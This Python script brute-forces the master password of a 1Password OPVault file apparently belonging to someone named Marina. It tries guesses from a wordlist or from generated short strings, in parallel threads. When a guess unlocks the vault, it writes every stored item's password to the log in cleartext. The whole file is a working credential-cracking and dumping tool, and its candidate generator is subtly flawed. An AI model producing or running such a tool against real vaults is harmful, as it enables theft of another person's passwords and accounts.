from concurrent.futures import ThreadPoolExecutor
import logging as log
import os
import sys
import string
import time

import itertools

from opvault.onepass import OnePass
from opvault import exceptions
from opvault import designation_types


PASSWORD_LENGTH = 3
tested = 0
generated = 0
done = False


def monitor():
    global done
    global tested
    global generated

    while (generated == 0) or (tested < generated and not done):
        time.sleep(1)
        sys.stdout.write('%d/%d\r' % (tested, generated))
        sys.stdout.flush
    done = True


def worker(password):
    global tested
    global done
    tested += 1
    try:
        master_password = password.strip()
        if not master_password:
            return
        vault = OnePass('Marina.vault.opvault')
        vault.unlock(master_password=master_password)
        vault.load_items()
        log.info(vault.getItems())
        for item in vault.getItems().keys():
            overview, details = vault.get_item(item)
            password = [field['value'] for field in details['fields']
                        if field['designation'] == designation_types.DesignationTypes.PASSWORD][0]

            log.info("%s : %s" % (item, password))
        done = True
    except exceptions.OpvaultException:
        pass


def main():
    global tested
    global generated
    global done

    root = log.getLogger()
    root.setLevel(log.DEBUG)

    with ThreadPoolExecutor(max_workers=os.cpu_count()) as executor:
        executor.submit(monitor)
        if len(sys.argv) > 1:
            log.info('Load Password file')
            with open(sys.argv[1],'r', encoding='utf-8') as f:
                futures = [executor.submit(worker, l) for l in f.readlines()]
            generated = len(futures)
        else:
            log.info('Generate random passwords')
            futures = []
            for l in range(1, PASSWORD_LENGTH):
                for p in itertools.combinations_with_replacement(string.printable, l):
                    generated += 1
                    s = ''.join(p)
                    executor.submit(worker, s)

        log.info('Waiting')
        while not done:
            time.sleep(1)
        log.info('Done %d/%d', tested, generated)
        executor.shutdown(wait=True)



if __name__ == '__main__':
    main()
